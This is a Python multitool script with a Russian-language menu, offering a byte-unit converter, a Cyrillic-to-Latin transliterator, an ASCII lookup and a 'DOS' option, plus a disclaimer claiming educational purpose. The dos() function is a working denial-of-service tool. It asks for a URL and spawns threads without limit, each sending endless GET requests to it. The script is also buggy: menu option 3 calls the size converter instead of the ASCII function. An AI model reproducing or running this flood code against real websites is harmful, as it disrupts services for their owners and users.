import os
import sys
import threading
import requests
from pystyle import Colorate, Colors, Center, Write
import subprocess

COLOR_CODE = {
    "RESET": "\033[0m",
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[93m",
    "RED": "\033[31m",
    "CYAN": "\033[36m",
    "BOLD": "\033[01m",
    "PINK": "\033[95m",
    "URL_L": "\033[36m",
    "LI_G": "\033[92m",
    "F_CL": "\033[0m",
    "DARK": "\033[90m",
    "BLUE": "\033[1;34m",
}

current_theme = Colors.white_to_green

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
        sys.stdout.write("\x1b[8;40;140t")

def get_ascii_value():
    symbol = input(f"{COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Введите символ >> ")
    char_ASCII = ord(symbol)
    print(
        f"{COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Значение ASCII для {COLOR_CODE['YELLOW']}'{symbol}' {COLOR_CODE['RED']}равно [ {COLOR_CODE['YELLOW']}{char_ASCII}{COLOR_CODE['RED']} ]")
    input(f'{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}\nНажмите Enter, чтобы продолжить...')
    clear()

def dos():
    link = input('Введите ссылку: ')
    def attack():
        while True:
            requests.get(link)
    while True:
        threading.Thread(target=attack).start()

def convert_to_bits(input_str):
    units = {'tb': 1e12, 'gb': 1e9, 'mb': 1e6, 'kb': 1e3, 'b': 1, 'bit': 0.125}
    input_parts = input_str.split()
    if len(input_parts) == 2:
        input_value, input_unit = float(input_parts[0]), input_parts[1].lower()
        if input_unit in units:
            bytes_value = input_value * units[input_unit]
            kilobytes = bytes_value / 1024
            megabytes = kilobytes / 1024
            gigabytes = megabytes / 1024
            terabytes = gigabytes / 1024
            bits = bytes_value * 8
            print(" ")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {terabytes:.2f} TB")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {gigabytes:.2f} GB")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {megabytes:.2f} MB")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {kilobytes:.2f} KB")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {bytes_value:.2f} B")
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}     {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}= {bits:.2e} bit")
        else:
            print(
                f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Неверная единица измерения. Пожалуйста, используйте TB, GB, MB, KB, B или bit.")
    else:
        print(
            f"                   {COLOR_CODE['RED']}{COLOR_CODE['BOLD']}Неверный формат ввода. Введите значение и единицу измерения через пробел.")
    input(
        f'{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}\n                   {COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}Нажмите Enter, чтобы вернуться в меню')


def transform_text(input_text):
    translit_dict = {
        'а': 'a', 'б': 'b', 'в': 'v', 'г': 'g', 'д': 'd', 'е': 'e', 'ё': 'yo', 'ж': 'zh', 'з': 'z', 'и': 'i',
        'й': 'y', 'к': 'k', 'л': 'l', 'м': 'm', 'н': 'n', 'о': 'o', 'п': 'p', 'р': 'r', 'с': 's', 'т': 't',
        'у': 'u', 'ф': 'f', 'х': 'kh', 'ц': 'ts', 'ч': 'ch', 'ш': 'sh', 'щ': 'shch', 'ъ': '', 'ы': 'y',
        'ь': '', 'э': 'e', 'ю': 'yu', 'я': 'ya',
        'А': 'A', 'Б': 'B', 'В': 'V', 'Г': 'G', 'Д': 'D', 'Е': 'E', 'Ё': 'Yo', 'Ж': 'Zh', 'З': 'Z', 'И': 'I',
        'Й': 'Y', 'К': 'K', 'Л': 'L', 'М': 'M', 'Н': 'N', 'О': 'O', 'П': 'P', 'Р': 'R', 'С': 'S', 'Т': 'T',
        'У': 'U', 'Ф': 'F', 'Х': 'Kh', 'Ц': 'Ts', 'Ч': 'Ch', 'Ш': 'Sh', 'Щ': 'Shch', 'Ъ': '', 'Ы': 'Y',
        'Ь': '', 'Э': 'E', 'Ю': 'Yu', 'Я': 'Ya'
    }
    transformed_text = []
    for char in input_text:
        if char in translit_dict:
            transformed_text.append(translit_dict[char])
        else:
            transformed_text.append(char)
    return ''.join(transformed_text)

def print_logo():
    logo = f"""                      
                    ,--.          ____   
                  ,--.'|        ,'  , `. 
              ,--,:  : |     ,-+-,.' _ | 
           ,`--.'`|  ' :  ,-+-. ;   , || 
           |   :  :  | | ,--.'|'   |  ;| 
           :   |   \ | :|   |  ,', |  ': 
           |   : '  '; ||   | /  | |  || 
           '   ' ;.    ;'   | :  | :  |, 
           |   | | \   |;   . |  ; |--'  
           '   : |  ; .'|   : |  | ,     
           |   | '`--'  |   : '  |/      
           '   : |      ;   | |`-'       
           ;   |.'      |   ;/           
           '---'        '---'            

█████████████████████████████████████████████████
ПРОСИМ ВАС КАК ВВЕЛИ СВОИ ДАННЫЕ НЕ НАЖИМАТЬ 
ENTER ПОКА ВАС ЭТО НЕ ПОПРОСИТ ПРОГРАММА!!!

"""
    Write.Print(logo, Colors.white_to_green, interval=0.000005)

while True:
    clear()
    banner = r'''
              ███████   █████ ██████   ██████
              ░░██████ ░░███ ░░██████ ██████ 
               ░███░███ ░███  ░███░█████░███ 
               ░███░░███░███  ░███░░███ ░███ 
               ░███ ░░██████  ░███ ░░░  ░███ 
               ░███  ░░█████  ░███      ░███ 
               █████  ░░█████ █████     █████
              ░░░░░    ░░░░░ ░░░░░     ░░░░░  
                     BY @nometadone 
                       MAIN MENU         
         ┌─────────────────────────────────────────┐          
         │  1 | MEMORY SIZE                        │      
         │  2 | FORM TEXT                          │
         │  3 | ASCII VALUE                        │
         │  4 | DOS                                │ 
         └─────────────────────────────────────────┘         

      ┌────────────────────────────────────────────────┐
      │   q | Exit               i | Information       │
      └────────────────────────────────────────────────┘

    '''
    print(Colorate.Vertical(Colors.white_to_green, Center.XCenter(banner)))

    select = Write.Input(f'>> ', current_theme, interval=0.005)

    if select == '1':
        print_logo()
        input_str = input(f"Введите значение и единицу измерения (например, '1 TB') >> ")
        convert_to_bits(input_str)
        input('\n Enter to Restart')
    elif select == '2':
        print_logo()
        input_text = input(f'Введите текст >> ')
        transformed_text = transform_text(input_text)
        print(f'Готовый текст >> {transformed_text}')
        input('\n Enter to Restart')
    elif select == '3':
        print_logo()
        input_str = input("Введите значение и единицу измерения (например, '1 GB'): ")
        convert_to_bits(input_str)
        input('\n Enter to Restart')
    elif select == '4':
        dos()
    elif select == 'q':
        subprocess.run(["python", "main.py"])
        break
    elif select == 'i':
        Write.Print("""
            Отказ от ответственности
    Внимание: Данная мультитул утилита предоставляется исключительно для информационных и образовательных целей. Все инструменты, включенные в эту утилиту, предназначены для использования в рамках законных и этичных практик.

    Юридическая ответственность: Пользователь берет на себя полную ответственность за соблюдение всех применимых законов и нормативных актов в юрисдикции, в которой используется данная утилита. Любое использование программного обеспечения для незаконных, неэтичных или несанкционированных действий строго запрещено.

    Авторство и ответственность: Разработчики и авторы данной утилиты не несут ответственности за любой ущерб, утрату данных или последствия, вызванные использованием этой программы. Пользователь соглашается с тем, что он сам несет всю ответственность за любые действия, совершенные с использованием данной утилиты.

    Уведомление: Некоторые инструменты могут собирать, обрабатывать или передавать данные, использование которых регулируется законами о конфиденциальности и безопасности данных. Пользователь обязан убедиться в том, что все действия, совершаемые с помощью этой утилиты, соответствуют законодательству и не нарушают прав третьих лиц.

    Ограничение ответственности: Данная утилита предоставляется "как есть", без каких-либо гарантий, явных или подразумеваемых. Разработчики не гарантируют точности, надежности или корректности работы утилиты и не несут ответственности за любой ущерб, возникший в результате использования утилиты.

    Согласие: Приобретая и используя эту утилиту, вы подтверждаете свое согласие с вышеуказанными условиями. Незнание или непонимание данных условий не освобождает вас от ответственности за любые нарушения закона или прав третьих лиц, которые могут возникнуть в результате использования этой утилиты.
            """, current_theme, interval=0.005)
        input('\n Enter to Restart')


